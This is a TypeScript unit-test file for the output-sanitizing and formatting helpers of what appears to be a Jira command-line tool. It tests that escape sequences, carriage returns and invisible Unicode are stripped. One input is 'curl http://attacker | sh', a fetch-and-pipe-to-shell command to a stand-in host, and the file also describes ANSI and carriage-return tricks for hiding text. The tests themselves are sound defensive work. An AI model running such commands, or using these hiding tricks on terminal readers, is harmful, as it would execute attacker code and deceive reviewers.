/*
 * Copyright (c) 2026, Clay Chipps.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import { describe, expect, it } from 'vitest';
import { parseList } from '../../src/shared/base-command.js';
import { formatKeyValue, formatTable, stripControl } from '../../src/shared/output.js';

describe('stripControl', () => {
  it('removes escape sequences that could rewrite the terminal', () => {
    // Anyone who can file a ticket controls a summary; \s+ collapsing does not match ESC.
    expect(stripControl('Fix login\u001b[2K\u001b[1Aforged')).toBe('Fix login[2K[1Aforged');
    expect(stripControl('bell\u0007 backspace\u0008')).toBe('bell backspace');
    expect(stripControl('c1\u009b[31m')).toBe('c1[31m');
  });

  it('removes a carriage return, which hides text on screen while leaving it in the stream', () => {
    // Found in review: everything before a bare CR is overwritten in a terminal but still
    // reaches a caller reading stdout, splitting what a reviewer sees from what an agent gets.
    expect(stripControl('curl http://attacker | sh\recho harmless')).toBe('curl http://attacker | shecho harmless');
  });

  it('removes invisible Unicode format and bidi characters', () => {
    expect(stripControl('Approved: \u202Edesrever\u202C text')).toBe('Approved: desrever text');
    expect(stripControl('zero\u200Bwidth\uFEFFjoin')).toBe('zerowidthjoin');
  });

  it('keeps ordinary whitespace so layout still works', () => {
    expect(stripControl('line one\nline two\tend')).toBe('line one\nline two\tend');
  });
});

describe('parseList', () => {
  it('trims entries and drops blanks so no empty field name reaches the API', () => {
    expect(parseList('summary, status ')).toEqual(['summary', 'status']);
    // A trailing comma is what an agent templating a field list emits; Jira rejects `fields=`.
    expect(parseList('summary,')).toEqual(['summary']);
  });

  it('returns undefined for a value with nothing usable in it', () => {
    expect(parseList('')).toBeUndefined();
    expect(parseList(' , ')).toBeUndefined();
    expect(parseList(undefined)).toBeUndefined();
  });
});

describe('formatKeyValue', () => {
  it('aligns labels and omits undefined entries', () => {
    const rendered = formatKeyValue([
      ['Key', 'PROJ-1'],
      ['Assignee', undefined],
      ['Status', 'In Progress'],
    ]);

    expect(rendered).toBe(['Key:    PROJ-1', 'Status: In Progress'].join('\n'));
  });

  it('renders present-but-empty values as an em dash', () => {
    expect(formatKeyValue([['Summary', null]])).toBe('Summary: —');
  });

  it('strips control characters from server-supplied values', () => {
    expect(formatKeyValue([['Summary', 'ok\u001b[2Kforged']])).toBe('Summary: ok[2Kforged');
  });

  it('collapses newlines so one field never becomes two lines', () => {
    expect(formatKeyValue([['Summary', 'first\nsecond']])).toBe('Summary: first second');
  });

  it('returns an empty string when every value is absent', () => {
    expect(formatKeyValue([['Key', undefined]])).toBe('');
  });
});

describe('formatTable', () => {
  const columns = [
    { header: 'KEY', value: (row: { key: string; who?: string }) => row.key },
    { header: 'WHO', value: (row: { key: string; who?: string }) => row.who },
  ];

  it('sizes columns to their widest cell and underlines the header', () => {
    const rendered = formatTable([{ key: 'PROJ-1', who: 'Ada' }, { key: 'LONGER-22' }], columns);

    expect(rendered.split('\n')).toEqual(['KEY        WHO', '─────────  ───', 'PROJ-1     Ada', 'LONGER-22  —']);
  });

  it('leaves no trailing whitespace on any line', () => {
    const rendered = formatTable([{ key: 'A', who: 'B' }], columns);

    for (const line of rendered.split('\n')) expect(line).toBe(line.trimEnd());
  });

  it('returns an empty string for no rows', () => {
    expect(formatTable([], columns)).toBe('');
  });
});
